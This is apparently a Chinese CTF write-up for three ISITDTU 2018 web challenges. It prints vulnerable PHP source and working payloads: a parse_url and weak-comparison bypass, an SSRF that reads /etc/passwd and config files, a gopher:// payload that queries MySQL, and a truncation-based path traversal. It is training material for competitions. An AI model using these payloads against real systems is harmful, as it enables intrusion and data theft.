> 原文链接: https://www.anquanke.com//post/id/153258 


# ISITDTU CTF 2018 部分Web题目Writeup


                                阅读量   
                                **281401**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">9</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01bd28b3d0b6a8edfd.jpg)](https://p3.ssl.qhimg.com/t01bd28b3d0b6a8edfd.jpg)

28号的时候师傅们都在打real world ctf，看了一下real world ctf实在玩不动。。。于是就去玩了玩这个越南的ctf比赛的web部分的题目。整体而言这个比赛的web部分的题目偏中等难度，还是比较适合新手的一次练手，部分题目也有一定的新意。这里给出部分题目的writeup。



## IZ

> [题目地址](http://35.185.178.212/)

打开题目可以获得题目源码：

```
&lt;?php

include "config.php";
$number1 = rand(1,100000000000000);
$number2 = rand(1,100000000000);
$number3 = rand(1,100000000);
$url = urldecode($_SERVER['REQUEST_URI']);
$url = parse_url($url, PHP_URL_QUERY);
if (preg_match("/_/i", $url)) 
`{`
    die("...");
`}`
if (preg_match("/0/i", $url)) 
`{`
    die("...");
`}`
if (preg_match("/w+/i", $url)) 
`{`
    die("...");
`}`    
if(isset($_GET['_']) &amp;&amp; !empty($_GET['_']))
`{`
    $control = $_GET['_'];        
    if(!in_array($control, array(0,$number1)))
    `{`
        die("fail1");
    `}`
    if(!in_array($control, array(0,$number2)))
    `{`
        die("fail2");
    `}`
    if(!in_array($control, array(0,$number3)))
    `{`
        die("fail3");
    `}`
    echo $flag;
`}`
show_source(__FILE__);
?&gt;
```

可以看到题目的逻辑主要是获取query_string后用parse_url处理，处理后的$url再进行过滤，可以看到这里的过滤非常严所以想要绕过过滤还是有一定难度的。<br>
然而parse_url函数存在一个bug:<br>
当url的格式为`http:/localhost///x.php?key=value`的方式可以使其返回`False`<br>
这样就可以成功绕过之后的三次preg_match的过滤.<br>
绕过三次preg_match的过滤后程序又进行了三次in_array()判断，而三次in_array()的数组都存在0这样一个元素。而由php弱类型的特性，in_array()在判断时使用的是弱比较，当比较一个字符串和一个数字时默认会尝试把字符串转换为数字，如果字符串的第一个字符不是数字的话则该字符串会被转化成0.具体的转化规则可以参考[php.net中的描述](http://php.net/manual/zh/language.operators.comparison.php)。<br>
因此最终的payload为：

```
///?_=a
```

访问即可获取flag。



## Friss

> [题目地址](http://35.190.142.60/)

题目进去后是一个表单页面：<br>[![](https://p0.ssl.qhimg.com/t0156be5a0c256cebbc.png)](https://p0.ssl.qhimg.com/t0156be5a0c256cebbc.png)

可以判断这个题目应该是要考ssrf相关的东西。于是首先测试file协议看能不能读到文件，输入`file:///etc/passwd`，结果题目返回：

```
NULL
Only access to localhost
```

可以看到后台判断了服务器是否为localhost，所以我们通过`file://localhost/etc/passwd`即可绕过限制。这里我们尝试读题目源码：<br>`file://localhost/var/www/html/index.php`

```
&lt;?php
include_once "config.php";
if (isset($_POST['url'])&amp;&amp;!empty($_POST['url']))
`{`
    $url = $_POST['url'];
    $content_url = getUrlContent($url);
`}`
else
`{`
    $content_url = "";
`}`
if(isset($_GET['debug']))
`{`
    show_source(__FILE__);
`}`


?&gt;
```

`file://localhost/var/www/html/config.php`

```
&lt;?php


$hosts = "localhost";
$dbusername = "ssrf_user";
$dbpasswd = "";
$dbname = "ssrf";
$dbport = 3306;

$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);

function initdb($conn)
`{`
    $dbinit = "create table if not exists flag(secret varchar(100));";
    if(mysqli_query($conn,$dbinit)) return 1;
    else return 0;
`}`

function safe($url)
`{`
    $tmpurl = parse_url($url, PHP_URL_HOST);
    if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
    `{`
        var_dump($tmpurl);
        die("&lt;h1&gt;Only access to localhost&lt;/h1&gt;");
    `}`
    return $url;
`}`

function getUrlContent($url)`{`
    $url = safe($url);
    $url = escapeshellarg($url);
    $pl = "curl ".$url;
    echo $pl;
    $content = shell_exec($pl);
    return $content;
`}`
initdb($conn);
?&gt;
```

可以看到在config.php中告诉我们flag在数据库中且给出了我们一个空密码的mysql账户。因此我们便可以联想到34c3ctf中的一道[使用gopher协议攻击mysql的题目](http://www.freebuf.com/articles/web/159342.html)。

这里gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。<br>
因此我们可以在本地用mysql搭建同样的环境，使用mysql客户端进行一次连接并获取执行读取flag的操作，用wireshark抓包后将抓取到的数据urlencode之后构造成符合gopher结构的payload即可获取到最后的flag。<br>
首先我们创建相同的用户和同样的表结构：[![](https://p3.ssl.qhimg.com/t013058e72ceef9e2ac.png)](https://p3.ssl.qhimg.com/t013058e72ceef9e2ac.png)然后给该用户此数据库的权限后使用该用户登入，获取该数据库内的flag信息，同时使用wireshark抓取lo上的包:<br>[![](https://p2.ssl.qhimg.com/t015c3a4af5175d3803.png)](https://p2.ssl.qhimg.com/t015c3a4af5175d3803.png)<br>[![](https://p4.ssl.qhimg.com/t015505823f6c7c57ab.png)](https://p4.ssl.qhimg.com/t015505823f6c7c57ab.png)wireshark中我们设置只显示客户端发送的数据包，以原始数据的形式显示<br>[![](https://p3.ssl.qhimg.com/t011d0763eeb24df413.png)](https://p3.ssl.qhimg.com/t011d0763eeb24df413.png)将数据复制下来转换成urlencode的形式，构造gopher的链接为：

```
gopher://127.0.0.1:3306/_%A8%00%00%01%85%A6%FF%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00mysql_native_password%00f%03_os%05Linux%0C_client_name%08libmysql%04_pid%0519500%0F_client_version%065.7.22%09_platform%06x86_64%0Cprogram_name%05mysql%21%00%00%00%03select%20%40%40version_comment%20limit%201%12%00%00%00%03SELECT%20DATABASE%28%29%05%00%00%00%02ssrf%0F%00%00%00%03show%20databases%0C%00%00%00%03show%20tables%06%00%00%00%04flag%00%13%00%00%00%03select%20%2A%20from%20flag%01%00%00%00%01
```

最后可以在回显中获取flag<br>[![](https://p5.ssl.qhimg.com/t019c4894b8888e1928.png)](https://p5.ssl.qhimg.com/t019c4894b8888e1928.png)



## NNService

> [题目地址](http://35.240.231.243/)

先扫描查看是否存在源码泄露，发现存在robots.txt,提示存在源码bk/bk.zip,访问即可获取题目的源码。<br>
这里我们主要分析题目最后导致getflag的两个点，在`index.controller.php`中,首先分析更改个人信息的位置上传头像的点:

```
if($_FILES['avatar'] and $_FILES["avatar"]["error"] == 0)`{`
                if((($_FILES["avatar"]["type"] == "image/gif") or ($_FILES["avatar"]["type"] == "image/jpeg") or ($_FILES["avatar"]["type"] == "image/png")) and $_FILES['avatar']['size']&lt;65535)`{`
                    $info=getimagesize($_FILES['avatar']['tmp_name']);
                    if(@is_array($info) and array_key_exists('mime',$info))`{`
                        $type=explode('/',$info['mime'])[1];
                        $filepath=$this-&gt;user-&gt;getuser().".".$type;
                        $filename="uploads/".$filepath;
                        if(is_uploaded_file($_FILES['avatar']['tmp_name']))`{`
                            $this-&gt;user-&gt;edit("avatar",array($filepath,$type));
                            if(strpos($filepath,"..") !== false)
                            `{`
                                die("Hacker, cut please!");
                            `}`
                            else if(move_uploaded_file($_FILES['avatar']['tmp_name'], $filename))`{`
                                quit_and_refresh('Upload success!','edit');
                            `}`
                            quit_and_refresh('Success!','edit');
                        `}`
                    `}`else `{`
                        //TODO！report it！
                        quit('Only allow gif/jpeg/png files smaller than 64kb!');
                    `}`
                `}`
                else`{`
                    //TODO！report it！
                    quit('Only allow gif/jpeg/png files smaller than 64kb!');
                `}`
            `}`
```

分析代码流程，首先判断图片的mime类型，然后使用getimagesize获取图片的信息，之后从getimagesize获取到的图片信息中获取图片的后缀名，之后可以看到`$filepath=$this-&gt;user-&gt;getuser().".".$type;`，将用户名与图片名称拼接为图片上传路径，后调用`$this-&gt;user-&gt;edit("avatar",array($filepath,$type));`,跟到`user.class.php`文件中可以发现这一步的操作实质是将文件名写入了数据库中。之后**使用强等于**判断文件名中是否含有`..`，如果含有`..`则终止整个流程，否则将移动上传的图片到upload文件夹下，命名为`用户名.文件类型`;<br>
然后我们再分析export处的源码：

```
public function export()`{`
        $avatar=$this-&gt;user-&gt;getavatar();
        if(substr($avatar,0,5)!=="data:")`{`
            $fileavatar=substr($this-&gt;user-&gt;getavatar(),1);
            $avatar = "uploads/".$fileavatar;


            if(file_exists($avatar) and filesize($avatar)&lt;65535 and strpos($fileavatar,"..")==false)`{`
                $data=file_get_contents($avatar);
                if(!$this-&gt;user-&gt;updateavatar($data)) quit('Something error!');
            `}`
            else`{`
                //TODO！report it！
                $out="Your avatar is invalid, so we reported it"."&lt;/p&gt;";
                include("templates/error.html");
                die("&lt;br&gt;");
            `}`
        `}`
        $article=$this-&gt;user-&gt;getarticle();
        $data="";
        for($i=0;$i&lt;count($article);$i++)`{`
            if($i!=count($article)-1)`{`
                $data.=$article[$i][2]."rn";
                $data.=$article[$i][3]."n";
                $data.="----------n";
            `}`
            else`{`
                $data.=$article[$i][2]."rn";
                $data.=$article[$i][3]."n";
            `}`
        `}`
        $data.="==========n";
        $avatar=$this-&gt;user-&gt;getavatar(1);
        $data.=base64_encode($avatar[1])."n";
        $data.=$avatar[3];
        header("Content-type: application/octet-stream");
        header("Content-Transfer-Encoding: binary");
        header("Accept-Ranges: bytes");
        header("Content-Length: ".strlen($data));
        header("Content-Disposition: attachment; filename="".$this-&gt;user-&gt;getuser().""");
        echo $data;
`}`
```

可以看到export处的代码在进行导出时，首先调用`$avatar=$this-&gt;user-&gt;getavatar();`获取头像的信息，我们跟到`user.class.php`中可以发现这一步操作便是将我们之前写入数据库的文件名取出。然后这里的代码对文件进行判断，判断文件是否存在，文件大小是否小于65535，以及**使用弱等于**判断文件名中是否含有`..`。之后便获取文件内容并base64加密后拼接上之前的一些信息输出文件。<br>
这里我们可以看到主要的漏洞点在于写入数据库的操作在判断文件名是否包含`..`之前，因此我们即使文件名中包含了`..`最后不合法的文件名也会被写入数据库。而在之后export处读取到文件名后使用的是弱等于判断：

```
strpos($fileavatar,"..")==false
```

然而当我们构造类似`../flag.php`的字符串时，strpos返回`..`出现的位置0，而`0==false`成立。因此我们便可以成功实现目录穿越。<br>
但是这里还有一点：我们的文件名的生成方式是`用户名.文件类型`,文件类型由getimagesize()函数获得，因此只能是图片文件的后缀名，那么怎样才能截断这个后缀名从而成功获取`flag.php`的源码？<br>
这里我们查看之前下载到的源码中的sql文件:

```
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(32) primary key auto_increment,
  `username` varchar(100) UNIQUE KEY,
  `nickname` varchar(100) UNIQUE KEY,
  `password` varchar(32),
  `email` varchar(100) UNIQUE KEY
);

CREATE TABLE IF NOT EXISTS `articles` (
  `id` int(32) primary key auto_increment,
  `user_id` int(32),
  `title` varchar(100),
  `content` varchar(500)
);

CREATE TABLE IF NOT EXISTS `avatar` (
    `id` int(32) primary key auto_increment,
    `data` blob,
    `user_id` int(32) UNIQUE KEY,
    `filepath` varchar(100),
    `photo_type` varchar(20)
);
```

可以看到这里的sql文件中限制了图片路径`filepath`字段的长度最多为100，用户名`username`的长度也最多为100。这里便可以联想到mysql的一个性质：`当mysql开启宽松模式时，在INSERT的时候，如果你插入的字符超出了MySQL的字段长度，MySQL会自动截断到最大长度然后插入，并不会出错。`，具体可以参考这篇文章：[http://www.91ri.org/5963.html](http://www.91ri.org/5963.html)<br>
因此我们如果注册长度为100的用户名，在将文件名写入数据库时，用户名之后拼接的后缀便会被截断从而无法进入数据库，因此便实现了我们对文件的控制。<br>
最后解题的方法为：
<li>注册用户名：`..//////////////////////////////////////////////////////////////////////////////////////////flag.php`
</li>
- edit处随意上传一张图片
- export处导出数据，便可获得flag。


## 总结

这场比赛整体难度适中，比较适合新手用于提高自己的水平。此外比赛源码已经上传到[https://github.com/susers/Writeups](https://github.com/susers/Writeups)上，欢迎大家star与pull request！



## 参考资料
- [http://php.net/manual/zh/language.operators.comparison.php](http://php.net/manual/zh/language.operators.comparison.php)
- [http://www.freebuf.com/articles/web/159342.html](http://www.freebuf.com/articles/web/159342.html)
- [https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2](https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2)
- [http://www.91ri.org/5963.html](http://www.91ri.org/5963.html)